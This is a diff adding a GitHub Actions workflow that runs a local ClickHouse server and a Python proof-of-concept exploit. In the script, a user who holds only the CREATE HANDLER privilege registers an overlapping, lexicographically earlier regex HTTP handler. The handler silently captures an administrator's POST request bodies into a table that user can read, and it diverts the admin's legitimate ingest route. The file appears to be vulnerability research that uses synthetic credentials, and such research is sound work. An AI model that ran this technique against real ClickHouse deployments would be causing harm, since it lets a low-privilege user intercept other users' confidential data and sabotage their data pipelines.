@@ -1,0 +1,96 @@
+name: ClickHouse SQL HTTP Handler Overlap E2E
+on:
+  push:
+    branches: [research-clickhouse-http-handler-overlap-20261113]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: Launch stock ClickHouse HEAD
+        shell: bash
+        run: |
+          set -euo pipefail
+          docker run -d --name ch-handler --network host --memory 4g --ulimit nofile=262144:262144 \
+            -e CLICKHOUSE_USER=admin -e CLICKHOUSE_PASSWORD=synthetic-admin-only \
+            -e CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT=1 \
+            clickhouse/clickhouse-server:head
+          for i in {1..90}; do
+            if curl -fsS --user admin:synthetic-admin-only "http://127.0.0.1:8123/?query=SELECT%201" >/dev/null; then break; fi
+            sleep 2
+          done
+          curl -fsS --user admin:synthetic-admin-only "http://127.0.0.1:8123/?query=SELECT%20version()"
+      - name: Attempt cross-user HTTP handler request-body capture
+        shell: bash
+        run: |
+          cat > /tmp/handler_overlap_e2e.py <<'PY'
+          import urllib.request,urllib.error,base64,sys
+          HOST="http://127.0.0.1:8123"
+          def req(path,body,user="admin",query=False,content_type="text/plain"):
+              pw={"admin":"synthetic-admin-only","creator":"synthetic-low-password"}[user]
+              r=urllib.request.Request(HOST+path,data=body.encode(),method="POST")
+              r.add_header("Authorization","Basic "+base64.b64encode(f"{user}:{pw}".encode()).decode())
+              r.add_header("Content-Type",content_type)
+              try:
+                  with urllib.request.urlopen(r,timeout=20) as f:
+                      return f.status,f.read().decode(errors="replace").strip()
+              except urllib.error.HTTPError as e:
+                  return e.code,e.read().decode(errors="replace").strip()
+          def sql(q,user="admin"):
+              c,b=req("/",q,user)
+              print("SQL",user,q[:170],c,b[:300],flush=True)
+              return c,b
+          def must(q):
+              c,b=sql(q)
+              if c!=200:raise RuntimeError(f"SETUP_FAIL {q}: {c} {b}")
+              return b
+          def outcome(name,success,details):
+              print(f"CHECK {name}: {'PASS' if success else 'INVESTIGATE'} {details}",flush=True)
+              return success
+          ver=must("SELECT version()")
+          must("CREATE DATABASE handler_lab")
+          must("CREATE TABLE handler_lab.legit_sink (id UInt32, note String) ENGINE=MergeTree ORDER BY id")
+          must("CREATE TABLE handler_lab.captured (payload String) ENGINE=MergeTree ORDER BY tuple()")
+          must("CREATE USER creator IDENTIFIED WITH plaintext_password BY 'synthetic-low-password'")
+          must("GRANT CREATE HANDLER ON *.* TO creator")
+          must("GRANT SELECT ON handler_lab.captured TO creator")
+          # An admin-owned business route, created before the lower-privilege actor can add one.
+          must("CREATE HANDLER z_legit URL '/lab/ingest' METHODS (POST) AS INSERT INTO handler_lab.legit_sink FORMAT CSV")
+          a,b=req("/lab/ingest","1,BASELINE_LEGIT\n")
+          baseline=outcome("admin_legit_baseline",a==200,(a,b))
+          must("SELECT count() FROM handler_lab.legit_sink LIMIT 1 SETTINGS max_execution_time=10,max_rows_to_read=100000")
+          # The creator cannot read the admin sink, and cannot write to the capture sink.
+          c,d=sql("SELECT note FROM handler_lab.legit_sink LIMIT 1 SETTINGS max_execution_time=10,max_rows_to_read=100000","creator")
+          no_sink=outcome("creator_cannot_select_legit_sink",c==403,(c,d[:220]))
+          c,d=sql("INSERT INTO handler_lab.captured VALUES ('NO_WRITE')","creator")
+          no_insert=outcome("creator_cannot_insert_capture_directly",c==403,(c,d[:220]))
+          # Same path, different matching type: the regex is deliberately lexicographically earlier.
+          payload_query="CREATE HANDLER a_capture URL REGEXP '/lab/ingest' METHODS (POST) AS INSERT INTO handler_lab.captured SELECT {_request_body:String}"
+          c,d=sql(payload_query,"creator")
+          created=outcome("creator_created_overlapping_regexp_handler",c==200,(c,d[:260]))
+          if not created:
+              print("STOP: CREATE HANDLER grant did not permit overlapping regex; no exploit",flush=True)
+              sys.exit(4)
+          c,d=req("/lab/ingest","2,SYNTHETIC_ADMIN_ONLY_SECRET\n")
+          send=outcome("legitimate_admin_post_after_overlap",c==200,(c,d[:180]))
+          # The read back is by creator, not admin: this tests the actual confidentiality boundary.
+          c,d=sql("SELECT payload FROM handler_lab.captured LIMIT 5 SETTINGS max_execution_time=10,max_rows_to_read=100000","creator")
+          leaked=outcome("creator_observed_admin_request_body",c==200 and "SYNTHETIC_ADMIN_ONLY_SECRET" in d,(c,d[:220]))
+          final=must("SELECT id, note FROM handler_lab.legit_sink ORDER BY id LIMIT 5 SETTINGS max_execution_time=10,max_rows_to_read=100000")
+          diverted=outcome("admin_original_route_diverted","BASELINE_LEGIT" in final and "SYNTHETIC_ADMIN_ONLY_SECRET" not in final,repr(final))
+          # The query inside the malicious route should still fail if invoked as low user.
+          c,d=req("/lab/ingest","3,ATTACKER_TEST\n",user="creator")
+          low_denied=outcome("creator_own_upload_cannot_write_capture",c!=200,(c,d[:200]))
+          if all((baseline,no_sink,no_insert,created,send,leaked,diverted,low_denied)):
+              print("CANDIDATE_E2E: CREATE HANDLER-only user captured POST body of administrative user through overlapping lexicographically earlier regex, using admin request identity; evaluate CREATE HANDLER authority and expected routing policy.",flush=True)
+          else:
+              print("VERDICT: Not an independently proven full cross-user body interception",flush=True)
+              sys.exit(3)
+          PY
+          python3 /tmp/handler_overlap_e2e.py
+      - name: Logs on failure
+        if: failure()
+        run: docker logs --tail 125 ch-handler 2>&1 | tail -125
